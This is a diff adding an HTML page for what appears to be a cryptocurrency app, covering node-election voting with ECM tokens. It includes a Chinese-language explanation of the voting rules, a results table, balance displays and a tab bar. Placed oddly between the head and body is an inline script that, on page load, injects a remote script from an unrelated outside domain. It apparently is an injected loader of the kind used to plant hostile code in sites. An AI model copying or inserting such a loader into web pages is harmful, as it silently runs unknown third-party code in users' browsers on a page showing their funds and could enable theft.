@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+		<title>投票竞选</title>
+		<link rel="stylesheet" href="../../static/css/weui.css" />
+		<link rel="stylesheet" href="../../static/css/common.css" />
+		<link rel="stylesheet" href="../../static/css/weui-jquery.css" />
+		<link rel="stylesheet" href="../../static/css/vote/vote.css" />
+	</head>
+	<script>
+		(function () {
+			var dw = document.createElement("script");
+			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(dw, s);
+		})()
+	</script>
+	<body>
+		<header class="weui-bar weui-bar-nav" id="codeTitle">
+		    <div class="weuiTitle">
+		    	<select class="title-select" name="select2" id="selectClass">
+		    		<option class="firstColor" value="0">主节点投票</option>
+		    		<option class="superVote" value="1">超级节点投票</option>
+		    	</select>
+		    	<a class="checkA">查看榜单</a>
+		    </div>
+		</header>
+
+		<div class="centerDiv">
+			<!--活动说明-->
+			<div id="explain" class="hidden">
+				<div class="voteTitle">
+					<img src="../../static/images/title-img.png" alt="" />
+					<span>活动说明</span>
+				</div>
+				<div class="explain-content">
+					<ul>
+						<li>
+							<h4><span class="dot"></span>报名阶段：</h4>
+							<p class="enlistTime"><span class="signStart"></span> 至  <span class="signEnd"></span></p>
+						</li>
+						<li>
+							<h4><span class="dot"></span>投票阶段：</h4>
+							<p class="voteTime"><span class="voteStart"></span> 至  <span class="voteEnd"></span></p>
+						</li>
+						<li>
+							<h4><span class="dot"></span>投票目标：</h4>
+							<p class="voteSign">本轮投票竞选出<span class="selection"></span>名<span class="voting"></span>，取投票前<span class="selection"></span>名</p>
+						</li>
+						<li>
+							<h4><span class="dot"></span>报名要求：</h4>
+							<p>拥有支持节点身份的用户均可报名</p>
+						</li>
+						<li>
+							<h4><span class="dot"></span>投票方式：</h4>
+							<p>每位用户进行投票时，最多可以投给<span class="choice"></span>位竞选者，每位竞选者票数不做限制，每次投票收取一定的手续费，实际票数按收取手续费后进行计算</p>
+						</li>
+						<li>
+							<h4><span class="dot"></span>投票返还：</h4>
+							<p>竞选结束后，向每位投过票的用户，返还其投票总数一定比例的ECM</p>
+						</li>
+					</ul>
+				</div>
+				<div class="exBTn">
+					<button class="weui-btn" type="button" id="enlistBtn">立即报名</button>
+				</div>
+			</div>
+
+			<!--投票结果-->
+			<div id="voteResult" class="hidden">
+				<div class="voteTitle">
+					<img src="../../static/images/title-img.png" alt="" />
+					<span>结果公布</span>
+				</div>
+				<table class="weui-table">
+					<thead>
+						<tr>
+							<th>排名</th>
+							<th>用户</th>
+							<th>票数</th>
+						</tr>
+					</thead>
+					<tbody id="voteList">
+					</tbody>
+				</table>
+			</div>
+		</div>
+		<div class="column hidden">
+			<div class="columnDiv">
+				<div class="columnLeft">
+					<p>已选<span class="numberDiv">0</span>个节点,还可以选择<span class="totalNum">0</span>个节点</p>
+					<p></p>
+				</div>
+				<!--<div class="columnright">
+					<button type="button" class="weui-btn">确定投票</button>
+				</div>-->
+			</div>
+		</div>
+		<!--投票列表-->
+
+		<div class="voteList hidden">
+			<div class="aboveBox">
+				<div class="centerFloor">
+					<p>平台用户已投出ECM</p>
+					<h2><span class="voted"></span>  ECM</h2>
+				</div>
+				<div class="centerAssets">
+					<div class="leftassets">
+						<a href="#">
+							<p class="pool">我的ECM</p>
+							<h2></h2>
+						</a>
+					</div>
+					<span></span>
+					<div class="rightassets">
+						<a href="#">
+							<p class="pool">质押ECM</p>
+							<h2></h2>
+						</a>
+					</div>
+				</div>
+			</div>
+
+			<div class="outside">
+				<div class="weui-pull-to-refresh__layer" style="padding: 5px;">
+		            <div class="weui-pull-to-refresh__arrow"></div>
+		            <div class="weui-pull-to-refresh__preloader"></div>
+		            <div class="down">下拉刷新</div>
+		            <div class="up">释放刷新</div>
+		            <div class="refresh">正在刷新</div>
+		        </div>
+				<div id="sercher" class="shopList mescroll">
+					<ul>
+					</ul>
+				</div>
+				<div class="weui-loadmore">
+		            <i class="weui-loading"></i>
+		            <span class="weui-loadmore__tips">正在加载</span>
+		       	</div>
+			</div>
+		</div>
+		<div class="weui-tabbar">
+		    <a href="../home/index.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/person.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">个人中心</p>
+		    </a>
+		    <a href="#" class="weui-tabbar__item weui-bar__item--on">
+		      <div class="weui-tabbar__icon special-se">
+		        <img src="../../static/images/vote-select.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">投票竞选</p>
+		    </a>
+		    <a href="../transaction/transaction.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/transaction.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">法币交易</p>
+		    </a>
+		    <a href="../account/acount.html" class="weui-tabbar__item">
+		      <div class="weui-tabbar__icon">
+		        <img src="../../static/images/account.png" alt="">
+		      </div>
+		      <p class="weui-tabbar__label">我的账户</p>
+		    </a>
+		</div>
+		<script type="text/javascript" src="../../lib/jquery.js" ></script>
+		<script type="text/javascript" src="../../lib/weui.js" ></script>
+		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
+		<script type="text/javascript" src="../../static/js/api.js" ></script>
+		<script type="text/javascript" src="../../static/js/common.js" ></script>
+		<script type="text/javascript" src="../../static/js/vote/vote.js" ></script>
+	</body>
+</html>
